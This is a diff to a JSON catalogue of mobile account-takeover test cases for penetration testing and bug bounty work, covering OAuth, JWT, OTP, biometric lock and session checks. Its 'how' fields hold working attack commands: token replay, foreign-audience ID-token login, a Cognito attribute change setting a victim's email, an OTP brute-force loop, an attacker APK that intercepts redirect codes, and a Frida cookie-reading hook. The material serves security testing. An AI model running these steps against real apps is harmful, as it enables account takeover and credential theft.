    "maps_to": "`hunt-session` Phase 3 + disclosed Pattern 3 ($4,000); ATT&CK T1640 Account Access Removal (the inverse test); H1 #194329",
    "record": "",
    "legacy_meta": {},
@@ -856,8 +879,10 @@
     "AM-01"
    ],
    "applies_to": "All OAuth/OIDC and custom refresh-token backends; every mobile app is a public client",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "draft-ietf-oauth-security-topics §2.2.2 (\"Refresh tokens for public clients MUST be sender-constrained or use refresh token rotation\"); RFC 9700; `hunt-session` Phase 7",
    "record": "",
    "legacy_meta": {},
@@ -902,8 +927,10 @@
     "AM-01"
    ],
    "applies_to": "All apps whose account page lists \"apps you have authorized\"",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "H1 #1632186 (Reddit, **Critical**, CWE Insufficient Session Expiration)",
    "record": "",
    "legacy_meta": {},
@@ -943,8 +970,11 @@
     "AM-05"
    ],
    "applies_to": "All apps with a device / session management screen",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "API1:2023 (the session record is an object with an owner); `hunt-idor` pattern library",
    "record": "",
    "legacy_meta": {},
@@ -988,8 +1018,11 @@
     "AM-05"
    ],
    "applies_to": "All B2B / multi-seat / staff-console apps",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "H1 #175490 (Shopify, \"Able to Login deactivated staff account in shopify app mobile\"), #126260 (Uber, non-activated users on the partner app)",
    "record": "",
    "legacy_meta": {},
@@ -1032,8 +1065,10 @@
     "AM-02"
    ],
    "applies_to": "Cookie-session and opaque-token backends. JWT-session backends: skip to D13-028",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-session` Phase 1 + disclosed Pattern 1 ($7,500), Phase 5 + disclosed Pattern 4 ($5,000); NIST SP 800-63B (≥ 64 bits)",
    "record": "",
    "legacy_meta": {},
@@ -1078,8 +1113,12 @@
     "AM-11"
    ],
    "applies_to": "All apps with an app-level lock (biometric / PIN) over an already-authenticated session",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, biometric, device",
+   "requires_tags": [
+    "backend-api",
+    "biometric",
+    "device"
+   ],
    "maps_to": "MASWE-0024; m_kamal banking-app finding: \"The application was sending authenticated API requests using the stored authorization token before showing the biometric prompt\"",
    "record": "",
    "legacy_meta": {},
@@ -1105,7 +1144,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "The lock screen is cosmetic if the session is already live behind it. Watch the request timeline *before* touching the prompt, and test whether \"locked\" means anything to the backend at all.",
-   "how": "```bash\n# with the proxy inserted and pinning removed, kill and relaunch, then watch Burp BEFORE touching the prompt\nadb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1\n# then, with the app locked in its UI, replay a captured authenticated request with the same token\ncurl -s -o /dev/null -w 'locked-state replay [%{http_code}]\\n' https://api.target/v1/me -H \"Authorization: Bearer $T\"\ngrep -rnE 'clearApplicationUserData|onTrimMemory|logout\\(|invalidateToken|revoke' jadx_out/sources\n```",
+   "how": "```bash\n# with the proxy inserted and pinning removed, kill and relaunch, then watch Burp BEFORE touching the prompt\nadb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1\n# then, with the app locked in its UI, replay a captured authenticated request with the same token\ncurl -s -o /dev/null -w 'locked-state replay [%{http_code}]\\n' https://api.target/v1/me -H \"Authorization: Bearer $T\"\ngrep -rnE 'clearApplicationUserData|onTrimMemory|logout\\(|invalidateToken|revoke' $DEC/jadx/sources\n```",
    "proof": "Burp showing authenticated requests returning 200 with the account's data while the biometric prompt is still on screen; plus a 200 on a request bearing the pre-lock token after the app is locked or killed.",
    "escalation": "→ D13-010 (the token is portable) → D11 token theft → fully remote ATO.",
    "ruled_out_when": "No authenticated request is issued until after the prompt resolves, *and* the backend rejects the pre-lock token while the app is locked (i.e. the lock actually invalidates server-side). The second half is rare; record it as a passing control with the transcript when you find it."
@@ -1126,8 +1165,11 @@
     "AM-11"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, device",
+   "requires_tags": [
+    "backend-api",
+    "device"
+   ],
    "maps_to": "`references/05` session and account-state bullets (Phase-25 escalation questions); MASWE-0024",
    "record": "",
    "legacy_meta": {},
@@ -1171,8 +1213,10 @@
     "AM-01"
    ],
    "applies_to": "Any JWT-based API — the default pattern for mobile backends",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "PortSwigger JWT attacks (`none`, `hashcat -m 16500`, `jwk`/`jku`/`kid`, RS256→HS256 confusion); OWASP REST Security Cheat Sheet (never accept `{\"alg\":\"none\"}`; verify `iss`, `aud`, `exp`, `nbf`; `jti` denylist); CWE-347",
    "record": "",
    "legacy_meta": {},
@@ -1219,8 +1263,10 @@
     "AM-01"
    ],
    "applies_to": "JWT-session mobile backends",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-session` Phase 6 + disclosed Pattern 6 ($2,500)",
    "record": "",
    "legacy_meta": {},
@@ -1270,8 +1316,11 @@
     "AM-01"
    ],
    "applies_to": "All apps offering native social sign-in alongside password accounts",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "oauth, backend-api",
+   "requires_tags": [
+    "oauth",
+    "backend-api"
+   ],
    "maps_to": "H1 #202177 (Instacart); Google backend-auth guidance (\"verify the integrity of the ID token\"); `hunt-oauth` \"iss/aud claim not validated\", \"alg=none on OIDC ID token\"",
    "record": "",
    "legacy_meta": {},
@@ -1294,7 +1343,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Three independent checks the backend must perform and frequently does not. (1) Does `aud` match *its own* client id, or is a signature check the only validation? (2) Is `iss` the expected issuer, or will a token from a different relying party's flow be accepted? (3) Does the link-by-email path check the IdP's `email_verified` claim, or does any token asserting the victim's address take over the account? Distinguish OIDC from plain OAuth first: `scope=openid` or `response_type=code id_token` ⇒ OIDC; `response_type=code` with no `openid` ⇒ plain OAuth 2.0 and the ID-token attacks do not apply.",
-   "how": "```bash\ngrep -rnE 'email_verified|getEmail\\(\\)|linkWithCredential|signInWithCredential|GoogleIdTokenCredential|GetGoogleIdOption|LoginManager|AccessToken|providerId' jadx_out/sources\n# grab an id_token from an unrelated app that uses the same IdP, then:\ncurl -X POST https://api.target/api/v2/users/google_login_auth \\\n  -d 'id_token=<TOKEN_ISSUED_TO_A_DIFFERENT_CLIENT_ID>&login_only=true' -i\npython3 -c \"import base64,json,sys;print(json.loads(base64.urlsafe_b64decode(sys.argv[1].split('.')[1]+'==')))\" \"$TOKEN\"\n# and the email_verified variant, against a provider that lets the user set their own address\ncurl -s -X POST https://api.target/v1/auth/social -H 'Content-Type: application/json' \\\n  -d '{\"provider\":\"custom\",\"id_token\":\"<jwt with email=victim@x, no email_verified>\"}' -i\n```",
+   "how": "```bash\ngrep -rnE 'email_verified|getEmail\\(\\)|linkWithCredential|signInWithCredential|GoogleIdTokenCredential|GetGoogleIdOption|LoginManager|AccessToken|providerId' $DEC/jadx/sources\n# grab an id_token from an unrelated app that uses the same IdP, then:\ncurl -X POST https://api.target/api/v2/users/google_login_auth \\\n  -d 'id_token=<TOKEN_ISSUED_TO_A_DIFFERENT_CLIENT_ID>&login_only=true' -i\npython3 -c \"import base64,json,sys;print(json.loads(base64.urlsafe_b64decode(sys.argv[1].split('.')[1]+'==')))\" \"$TOKEN\"\n# and the email_verified variant, against a provider that lets the user set their own address\ncurl -s -X POST https://api.target/v1/auth/social -H 'Content-Type: application/json' \\\n  -d '{\"provider\":\"custom\",\"id_token\":\"<jwt with email=victim@x, no email_verified>\"}' -i\n```",
    "proof": "A session for the victim's existing account returned in exchange for a token whose `aud` is a different application's client id — show the decoded `aud` beside the target's own client id. That decoded claim is unarguable, which is why it survives triage even when the program's first rating is low.",
    "escalation": "→ mass ATO for any user of that identity provider; this is the mobile realisation of the Non-verifying-IdP pre-hijacking class (D13-061).",
    "ruled_out_when": "A token with a foreign `aud` is rejected, a token from a foreign `iss` is rejected, and an unverified-email assertion creates a distinct account rather than linking to an existing one. Test all three — the `aud` check is the one most often present and the `email_verified` check the one most often missing."
@@ -1314,8 +1363,11 @@
     "AM-03"
    ],
    "applies_to": "Every mobile OAuth client",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "oauth, backend-api",
+   "requires_tags": [
+    "oauth",
+    "backend-api"
+   ],
    "maps_to": "RFC 8252 (public native clients MUST implement PKCE; AS MUST support it); draft-ietf-oauth-security-topics §2.1.1 (MUST use PKCE; MUST mitigate PKCE downgrade); `hunt-oauth` \"PKCE downgrade attack\"",
    "record": "",
    "legacy_meta": {},
@@ -1360,8 +1412,12 @@
     "AM-03"
    ],
    "applies_to": "All apps using custom-scheme OAuth redirects",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "oauth, deeplink, device",
+   "requires_tags": [
+    "oauth",
+    "deeplink",
+    "device"
+   ],
    "maps_to": "RFC 8252 on private-use URI schemes: \"multiple apps can typically register the same scheme, making it indeterminate as to which app will receive the authorization code\"; Google Mobile VRP class \"Leaking OAuth tokens\"",
    "record": "",
    "legacy_meta": {},
@@ -1388,7 +1444,7 @@
    "test": "Private-use scheme redirects (`com.example.app:/oauth2redirect`) can be registered by **any** installed app; the OS makes no ownership guarantee. Build a stub that claims the same scheme and see whether it receives the code.",
    "how": "```bash\n# 1. extract the scheme and the redirect_uri\naapt2 dump xmltree base.apk --file AndroidManifest.xml | grep -B4 -A4 'android:scheme'\n# 2. build a stub APK with the same <data android:scheme=\"com.example.app\"/> on an exported activity\n#    whose onCreate logs getIntent().getData()\nadb install attacker.apk && adb logcat -s ATTACKER:V\n# 3. confirm the scheme resolves to more than one handler\nadb shell pm query-activities -a android.intent.action.VIEW -d \"com.example.app:/oauth2redirect\"\nadb shell dumpsys package r | grep -A15 'com.example.app:'\n# 4. if the app instead claims an https redirect, verify the App Link is actually verified\nadb shell pm get-app-links com.target.app          # require state 'verified'\n```",
    "proof": "The attacker app's log line containing `code=...`, or the disambiguation chooser appearing (which itself proves two handlers are registered and the OS cannot decide). Then redeem the code — if PKCE is unenforced (D13-030), you get a token.",
-   "escalation": "→ D09 (deep links / App Link verification state) → D13-030 → ATO. Also test the loopback variant: an app that starts a local HTTP listener to catch the redirect exposes the code to every app on the device, because Android does not isolate loopback sockets between apps:\n```bash\ngrep -rnE 'ServerSocket|NanoHTTPD|bind\\(new InetSocketAddress' jadx_out/sources -B4 -A6\nadb shell 'cat /proc/net/tcp /proc/net/tcp6' | awk '{print $2}' | grep -v local_address\n```\nAndroid 16's local-network permission gates LAN sockets behind `NEARBY_WIFI_DEVICES`, but **loopback is not covered** — the bug remains.",
+   "escalation": "→ D09 (deep links / App Link verification state) → D13-030 → ATO. Also test the loopback variant: an app that starts a local HTTP listener to catch the redirect exposes the code to every app on the device, because Android does not isolate loopback sockets between apps:\n```bash\ngrep -rnE 'ServerSocket|NanoHTTPD|bind\\(new InetSocketAddress' $DEC/jadx/sources -B4 -A6\nadb shell 'cat /proc/net/tcp /proc/net/tcp6' | awk '{print $2}' | grep -v local_address\n```\nAndroid 16's local-network permission gates LAN sockets behind `NEARBY_WIFI_DEVICES`, but **loopback is not covered** — the bug remains.",
    "ruled_out_when": "The redirect is an `https` App Link whose Digital Asset Links verification reports `verified` (not `none`, `legacy_failure`, or a numeric error ≥ 1024), the stub app receives nothing, and no loopback listener is present. A `verified` App Link plus enforced PKCE closes this class."
   },
   {
@@ -1406,8 +1462,11 @@
     "AM-02"
    ],
    "applies_to": "All OAuth clients",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "oauth, backend-api",
+   "requires_tags": [
+    "oauth",
+    "backend-api"
+   ],
    "maps_to": "draft-ietf-oauth-security-topics §2.1 (\"authorization servers MUST utilize exact string matching except for port numbers in `localhost`\"); RFC 9700 / RFC 6819; H1 #1861974 ($2,000), #1567186",
    "record": "",
    "legacy_meta": {},
@@ -1449,8 +1508,11 @@
     "AM-02"
    ],
    "applies_to": "Any OAuth/OIDC integration",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "oauth, backend-api",
+   "requires_tags": [
+    "oauth",
+    "backend-api"
+   ],
    "maps_to": "draft-ietf-oauth-security-topics §2.1.4 (\"a defense against mix-up attacks is REQUIRED\"), §4.5.3 code-injection defences; RFC 9207 (`iss` response parameter); `hunt-oauth` FP trap \"State parameter exists but isn't validated\"",
    "record": "",
    "legacy_meta": {},
@@ -1494,8 +1556,11 @@
     "AM-08"
    ],
    "applies_to": "All. **LEGACY:** apps predating AppAuth/Custom Tabs (roughly pre-2016) do this by default",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "oauth, device",
+   "requires_tags": [
+    "oauth",
+    "device"
+   ],
    "maps_to": "RFC 8252: \"native apps MUST NOT use embedded user-agents to perform authorization requests\"; `CustomTabsIntent` documentation (the host app has no access to Custom Tab content or cookies)",
    "record": "",
    "legacy_meta": {},
@@ -1519,7 +1584,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "An embedded WebView lets the host app read the credentials the user types and the IdP's session cookies — which means a repackaged clone can, and means the legitimate app is one XSS away from the same.",
-   "how": "```bash\nS=jadx_out/sources\ngrep -rn 'loadUrl(\\|WebViewClient\\|shouldOverrideUrlLoading\\|onPageFinished' $S | grep -iE 'oauth|authorize|login|sso|saml'\ngrep -rn 'CustomTabsIntent\\|androidx.browser.customtabs\\|AppAuth\\|net.openid.appauth' $S\n```\nIf `CustomTabsIntent` is present, the app is doing it correctly. If the authorize URL is loaded into a `WebView`, demonstrate the capability:\n```js\nJava.perform(function () {\n  var WV = Java.use('android.webkit.WebView');\n  WV.evaluateJavascript.overload('java.lang.String','android.webkit.ValueCallback')\n    .implementation = function (js, cb) { console.log('[eval] ' + js); return this.evaluateJavascript(js, cb); };\n  var CM = Java.use('android.webkit.CookieManager');\n  console.log('[idp cookie] ' + CM.getInstance().getCookie('https://accounts.idp.example'));\n});\n```",
+   "how": "```bash\nS=$DEC/jadx/sources\ngrep -rn 'loadUrl(\\|WebViewClient\\|shouldOverrideUrlLoading\\|onPageFinished' $S | grep -iE 'oauth|authorize|login|sso|saml'\ngrep -rn 'CustomTabsIntent\\|androidx.browser.customtabs\\|AppAuth\\|net.openid.appauth' $S\n```\nIf `CustomTabsIntent` is present, the app is doing it correctly. If the authorize URL is loaded into a `WebView`, demonstrate the capability:\n```js\nJava.perform(function () {\n  var WV = Java.use('android.webkit.WebView');\n  WV.evaluateJavascript.overload('java.lang.String','android.webkit.ValueCallback')\n    .implementation = function (js, cb) { console.log('[eval] ' + js); return this.evaluateJavascript(js, cb); };\n  var CM = Java.use('android.webkit.CookieManager');\n  console.log('[idp cookie] ' + CM.getInstance().getCookie('https://accounts.idp.example'));\n});\n```",
    "proof": "The authorize URL logged at `loadUrl` inside an in-process WebView, plus either injected JS reading the credential form or `CookieManager.getInstance().getCookie(idpUrl)` returning the IdP session cookie from inside the app's process.",
    "escalation": "WebView + `addJavascriptInterface` on the auth page is direct credential theft → D10 bridge → D13-010.",
    "ruled_out_when": "The authorize URL is handed to `CustomTabsIntent` or AppAuth and never reaches an in-process `WebView` — confirm at runtime, not only in source, because a fallback path frequently exists for devices with no Custom Tabs provider. Force that fallback (uninstall every browser that supports Custom Tabs) and re-check."
@@ -1539,8 +1604,11 @@
     "AM-01"
    ],
    "applies_to": "Apps with both direct and federated signup",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "oauth, backend-api",
+   "requires_tags": [
+    "oauth",
+    "backend-api"
+   ],
    "maps_to": "H1 #922456 ($3,000, email-verification bypass through the OAuth flow), #740989 (staff without the app permission reaching an app via OAuth misconfiguration)",
    "record": "",
    "legacy_meta": {},
@@ -1585,8 +1653,11 @@
     "AM-01"
    ],
    "applies_to": "Cognito / Firebase-Auth / Auth0-backed mobile apps",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "oauth, backend-api",
+   "requires_tags": [
+    "oauth",
+    "backend-api"
+   ],
    "maps_to": "H1 #1342088 (AWS Cognito API misconfiguration allowing ATO), #1679734; `hunt-ato` \"Modern ATO increasingly lives in the identity layer, not the password form\"",
    "record": "",
    "legacy_meta": {},
@@ -1611,7 +1682,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "The app delegates identity to a provider and misconfigures it — self-service attribute updates, unverified-email account linking, or a user-pool API reachable directly from the client. **Mobile apps ship the pool and client ids in the binary, which is exactly how you find the surface.**",
-   "how": "```bash\ngrep -rnE 'cognito-idp|CognitoUserPool|us-[a-z]+-[0-9]_[A-Za-z0-9]+|identityPoolId|firebaseio|FirebaseApp|auth0\\.com|clientId' \\\n  jadx_out/sources jadx_out/resources/res/values/strings.xml\n# then exercise the provider surface directly\naws cognito-idp initiate-auth --client-id \"$CID\" --auth-flow USER_PASSWORD_AUTH \\\n  --auth-parameters USERNAME=$U,PASSWORD=$P --region \"$REGION\"\naws cognito-idp update-user-attributes --access-token \"$AT\" \\\n  --user-attributes Name=email,Value=victim@target.example\n```",
+   "how": "```bash\ngrep -rnE 'cognito-idp|CognitoUserPool|us-[a-z]+-[0-9]_[A-Za-z0-9]+|identityPoolId|firebaseio|FirebaseApp|auth0\\.com|clientId' \\\n  $DEC/jadx/sources $DEC/jadx/resources/res/values/strings.xml\n# then exercise the provider surface directly\naws cognito-idp initiate-auth --client-id \"$CID\" --auth-flow USER_PASSWORD_AUTH \\\n  --auth-parameters USERNAME=$U,PASSWORD=$P --region \"$REGION\"\naws cognito-idp update-user-attributes --access-token \"$AT\" \\\n  --user-attributes Name=email,Value=victim@target.example\n```",
    "proof": "Your credential bound to a victim's account, shown with a D13-003 marker that the victim account carries and the attacker account now returns.",
    "escalation": "→ D18 (the rest of the cloud backend) → D15.",
    "ruled_out_when": "The pool's attribute schema marks the identity attributes immutable, `update-user-attributes` on an identity attribute is refused, and linking requires a verified email. Note that finding the pool id itself is expected and not a finding — the self-service mutation is."
@@ -1629,8 +1700,11 @@
    "attacker": "n/a",
    "attacker_ids": [],
    "applies_to": "Any automated auth-response classifier, including your own agent loops",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "oauth, backend-api",
+   "requires_tags": [
+    "oauth",
+    "backend-api"
+   ],
    "maps_to": "ENGAGEMENTS.md Engagement 02 gap #3 (`feedback_oauth_substring_trap`) → `hunt-oauth`, `m365-entra-attack`",
    "record": "",
    "legacy_meta": {},
@@ -1668,8 +1742,10 @@
     "AM-01"
    ],
    "applies_to": "All OTP verify endpoints — **especially mobile ones, where the limit is often enforced only client-side**",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "NIST SP 800-63B §5.2.2 (limit consecutive failed attempts to no more than 100), §5.1.3.2 (OOB secrets ≥ 20 bits; rate-limit required below 64 bits; accepted once during the validity period), §5.1.4.1/§5.1.4.2; `hunt-brute-force` Pattern 1 (Critical, $8,000: 100 attempts, no 429, no lockout on `POST /api/v2/auth/verify-otp`); H1 #125505 ($5,000), #743545",
    "record": "",
    "legacy_meta": {},
@@ -1717,8 +1793,10 @@
     "AM-01"
    ],
    "applies_to": "Any app whose lockout UX lives in the client — the single most mobile-specific item in the brute-force corpus",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-brute-force` pattern library, \"Watch for client-only limits (mobile apps) that the API doesn't enforce\"",
    "record": "",
    "legacy_meta": {},
@@ -1742,7 +1820,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "The app shows \"3 attempts remaining\" and locks its own UI. The server never counted. A recovery code in the corpus was brute-forceable for exactly this reason.",
-   "how": "```bash\n# find the counter in the client first — it tells you the number the server is NOT enforcing\ngrep -rnE 'attempts|retryCount|maxAttempts|remainingTries|lockUntil|MAX_OTP' jadx_out/sources | head -30\nadb shell run-as com.target.app cat shared_prefs/*.xml | grep -iE 'attempt|retry|lock'\n# then bypass the client entirely\npython3 - <<'PY'\nimport requests\nfor i in range(1, 51):\n    r = requests.post(\"https://api.target/v1/otp/verify\",\n                      json={\"phone\": PHONE, \"otp\": f\"{i:04d}\"}, timeout=10)\n    print(i, r.status_code, len(r.content))\nPY\n```",
+   "how": "```bash\n# find the counter in the client first — it tells you the number the server is NOT enforcing\ngrep -rnE 'attempts|retryCount|maxAttempts|remainingTries|lockUntil|MAX_OTP' $DEC/jadx/sources | head -30\nadb shell run-as com.target.app cat shared_prefs/*.xml | grep -iE 'attempt|retry|lock'\n# then bypass the client entirely\npython3 - <<'PY'\nimport requests\nfor i in range(1, 51):\n    r = requests.post(\"https://api.target/v1/otp/verify\",\n                      json={\"phone\": PHONE, \"otp\": f\"{i:04d}\"}, timeout=10)\n    print(i, r.status_code, len(r.content))\nPY\n```",
    "proof": "Attempt N+1 succeeding against the API after the app's UI would have locked out — with the client-side constant quoted from the decompiled source beside the transcript showing the server accepting attempt N+50.",
    "escalation": "→ D13-038 → ATO; the same pattern applies to PIN gates (D13-082) and to login (D13-013).",
    "ruled_out_when": "The server returns 429 at or below the client's own displayed threshold, and resetting the client-side counter (clearing `shared_prefs`, reinstalling) does not restore attempts server-side. Clearing app data is the quick check: if the counter resets and the server still refuses, the limit is genuinely server-side."
@@ -1762,8 +1840,10 @@
     "AM-01"
    ],
    "applies_to": "Any IP-keyed throttle behind a proxy",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-brute-force` Pattern 4; Gowthams `rate-limit-bypass.md` (verbatim header list); `hunt-business-logic` FP trap \"Rate-limit bypass framed as business logic\"",
    "record": "",
    "legacy_meta": {},
@@ -1806,8 +1886,10 @@
     "AM-01"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "H1 #205000 (Grab, High 7.5), #202425 (Grab, Medium 4.3), #149598 (cited in-report as prior art)",
    "record": "",
    "legacy_meta": {},
@@ -1848,8 +1930,10 @@
     "AM-01"
    ],
    "applies_to": "TOTP/HOTP/SMS verify endpoints",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "NIST SP 800-63B §5.1.4.2 (OTP accepted once during the validity period); `hunt-mfa-bypass` \"OTP replay\"; `security-arsenal` MFA Pattern 2",
    "record": "",
    "legacy_meta": {},
@@ -1891,8 +1975,10 @@
     "AM-01"
    ],
    "applies_to": "OTP verify endpoints, and any \"you may do this once\" control including MFA enrolment",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "`hunt-race-condition` pattern library; `hunt-mfa-bypass` \"Race condition on OTP-validate\"; H1 #300305 ($15,250, email-verification bypass enabling takeover), #2110030 ($3,000)",
    "record": "",
    "legacy_meta": {},
@@ -1936,8 +2022,10 @@
     "AM-04"
    ],
    "applies_to": "All OTP flows",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "CVE-2018-11505 (Werewolf Online, Firebase token via `D/RNFirebaseMessaging`, EDB 44776); CVE-2014-1664 (GoToMeeting logging request URLs with `authToken=`/`accessCode=`, EDB 39061); EDB 46933",
    "record": "",
    "legacy_meta": {},
@@ -1982,8 +2070,10 @@
     "AM-07"
    ],
    "applies_to": "Mobile apps and SPAs — the highest-yield mobile-specific MFA item",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "H1 #2762462 (MTN Group, **Critical 9.1**, CWE \"Authentication Bypass Using an Alternate Path or Channel\"), #33432 (Twitter); Gowthams `response-manipulation.md`; `hunt-mfa-bypass` \"Response manipulation — client-side MFA check\"",
    "record": "",
    "legacy_meta": {},
@@ -2026,8 +2116,11 @@
     "AM-05"
    ],
    "applies_to": "All OTP flows",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
    "maps_to": "NIST SP 800-63B §5.1.3.2 (OOB secrets bound to the authentication session); API1:2023",
    "record": "",
    "legacy_meta": {},
@@ -2072,8 +2165,10 @@
     "AM-01"
    ],
    "applies_to": "All OTP / magic-link flows",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "API4:2023 Unrestricted Resource Consumption (\"Successful attacks can lead to Denial of Service or an increase of operational costs\")",
    "record": "",
    "legacy_meta": {},
@@ -2117,8 +2212,10 @@
     "AM-04"
    ],
    "applies_to": "All",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device",
+   "requires_tags": [
+    "device"
+   ],
    "maps_to": "MASWE-0037 (notifications), MASWE-0030 (clipboard), MASWE-0040 (accessibility); MASTG-TEST-0005, MASTG-TEST-0010, MASTG-TEST-0315; ATT&CK T1636.004, T1517, T1644, T1582, T1453; CVE-2025-10184 (permission-less SMS read via provider `update()` SQLi); CVE-2026-26123 (Microsoft Authenticator sign-in code in an unclaimed `ms-msa://` deeplink)",
    "record": "",
    "legacy_meta": {},
@@ -2158,7 +2255,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "An OTP that protects login can be read by any of four independent principals. Test **all four against the same app**, not one, because the fix for each is different and the severities differ by attacker model.",
-   "how": "```bash\n# 1. notification text\nadb shell cmd notification allow_listener com.poc.attacker/.Listener\nadb shell dumpsys notification --noredact | grep -iE 'android.title|android.text' | head -40\ngrep -rnE '\\.set(ContentText|ContentTitle|SubText|Ticker)\\(' jadx_out/sources -B6 \\\n  | grep -inE 'password|passcode|pin|secret|otp|token|auth(entication)?code'\n# 2. SMS: permission path and injected broadcast (see D13-049)\naapt2 dump permissions base.apk | grep -E 'RECEIVE_SMS|READ_SMS'\nadb shell content query --uri content://sms/inbox --projection \"address:body\" | head\n# 3. clipboard\ngrep -rnE 'setPrimaryClip|ClipData\\.newPlainText|EXTRA_IS_SENSITIVE' jadx_out/sources\nadb shell dumpsys clipboard 2>/dev/null\n# 4. accessibility readability of the OTP field\nadb shell uiautomator dump /sdcard/otp.xml && adb pull /sdcard/otp.xml && grep -i 'text=' otp.xml\n```",
+   "how": "```bash\n# 1. notification text\nadb shell cmd notification allow_listener com.poc.attacker/.Listener\nadb shell dumpsys notification --noredact | grep -iE 'android.title|android.text' | head -40\ngrep -rnE '\\.set(ContentText|ContentTitle|SubText|Ticker)\\(' $DEC/jadx/sources -B6 \\\n  | grep -inE 'password|passcode|pin|secret|otp|token|auth(entication)?code'\n# 2. SMS: permission path and injected broadcast (see D13-049)\naapt2 dump permissions base.apk | grep -E 'RECEIVE_SMS|READ_SMS'\nadb shell content query --uri content://sms/inbox --projection \"address:body\" | head\n# 3. clipboard\ngrep -rnE 'setPrimaryClip|ClipData\\.newPlainText|EXTRA_IS_SENSITIVE' $DEC/jadx/sources\nadb shell dumpsys clipboard 2>/dev/null\n# 4. accessibility readability of the OTP field\nadb shell uiautomator dump /sdcard/otp.xml && adb pull /sdcard/otp.xml && grep -i 'text=' otp.xml\n```",
    "proof": "The OTP value appearing in `dumpsys notification --noredact`, in a `uiautomator` dump of the entry screen, in the clipboard, or delivered to an unprivileged receiver — **and then the completed login on a second device using that value**. Capturing the code is half a report.",
    "escalation": "→ D05 (broadcast), D20 (clipboard/logging), D24 (push). Direct Reply abuse deserves its own check: does any of the client's notifications expose a `RemoteInput` action that performs a sensitive operation?",
    "ruled_out_when": "Notification text carries no code and uses `setVisibility(VISIBILITY_SECRET)` with a redacted `setPublicVersion`; the app uses the SMS Retriever API with no SMS permission; the clipboard is never written with the code (or is written with `EXTRA_IS_SENSITIVE`); and the OTP field is `android:importantForAccessibility=\"no\"` or a password-type input. State the precondition for each channel you do report — the notification path needs a user grant, whereas the injected-broadcast path (D13-049) needs **no** grant at all, and the severity should reflect that difference."
@@ -2178,8 +2275,11 @@
     "AM-03"
    ],
    "applies_to": "Any app using the SMS User Consent API — extremely common in fintech onboarding and card 3DS",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "exported-receiver, device",
+   "requires_tags": [
+    "exported-receiver",
+    "device"
+   ],
    "maps_to": "`developers.google.com/identity/sms-retriever/user-consent/request` (`SmsRetriever.SEND_PERMISSION`, `EXTRA_CONSENT_INTENT`, `EXTRA_SMS_MESSAGE`, `CommonStatusCodes.SUCCESS`/`TIMEOUT`); MASWE-0020; CVE-2021-4438 (React Native SMS User Consent)",
    "record": "",
    "legacy_meta": {},
@@ -2206,7 +2306,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "The documented registration passes `SmsRetriever.SEND_PERMISSION` so that **only Google Play services** may deliver that broadcast. A two-argument `registerReceiver`, or a manifest receiver with `exported=\"true\"` and no `android:permission`, lets any installed app inject a fake `EXTRA_SMS_MESSAGE` or a fake `EXTRA_CONSENT_INTENT`.",
